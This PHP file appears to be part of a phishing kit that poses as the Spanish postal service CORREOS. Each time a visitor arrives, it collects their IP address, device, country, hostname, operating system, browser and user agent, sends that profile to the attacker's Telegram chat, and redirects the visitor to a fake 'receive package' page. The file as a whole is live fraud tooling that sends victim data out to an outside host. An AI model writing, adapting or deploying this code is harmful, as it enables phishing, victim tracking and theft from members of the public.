<?php

include "./inc/app.php";
require_once "./settings/conf.php";


$Visit = visitors();

$message =  " [━━━━【🔔 CORREOS 🔔】━━━━] \r\n";
$message .= "【🎭   G   E   T      R   E   A   D   Y   !   🎭】\r\n";
$message .= " [━━━━━【🛎 Alert 🛎】━━━━━] \r\n";
$_message =  " *━━━━━━━━━【🎭 CORREOS 🎭】━━━━━━━━━* \r\n";
$_message .= "【🔔                               G E T   R E A D Y  !                               🔔】\r\n";
$_message .= " *━━━━━━━━━【💻 System 💻】━━━━━━━━━━* \r\n";
$_message .= '[👣 IP address : ' . $Visit[0] . "\r\n";
$_message .= '[🙊 IP Lookup : http://www.geoiptool.com/?IP=' . $Visit[0] . "\r\n";
$_message .= '[👁 Device : ' . $Visit[1] . "\r\n";
$_message .= '[📍 Country : ' . $Visit[2] . "\r\n";
$_message .= '[♟ hostname : ' . $Visit[3] . "\r\n";
$_message .= '[💿 OS : ' . get_user_os() . "\r\n";
$_message .= '[🌐 Browser Name: ' . $Visit[5] . "\r\n";
$_message .= '[🌐 Browser Vers: ' . $Visit[6] . "\r\n";
$_message .= '[🖥 Platform Name: ' . $Visit[7] . "\r\n";
$_message .= '[🖥 Platform Vers: ' . $Visit[8] . "\r\n";
$_message .= '[🕳 U-A : ' . $Visit[4] . "\r\n";
$_message .= " +━━━━━━━━━━【🌀 Link 🔱】━━━━━━━━━━━+ \r\n";
$_message .= " | 📌 https://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
$_message .= " +━━━━━━━━━━━━━━━━━━━━━━━━━━━━+ \r\n";

$_SESSION["IP"] = $Visit[0];
$_SESSION["msg"] = $_message;

TG_send($_message, TELEGRAM_TOKEN,TELEGRAM_CHAT_ID);
//TG_send($message, TELEGRAM_TOKEN, TELEGRAM_CHAT_IDD);



header("Location: Recibir_paquete.php");

?>

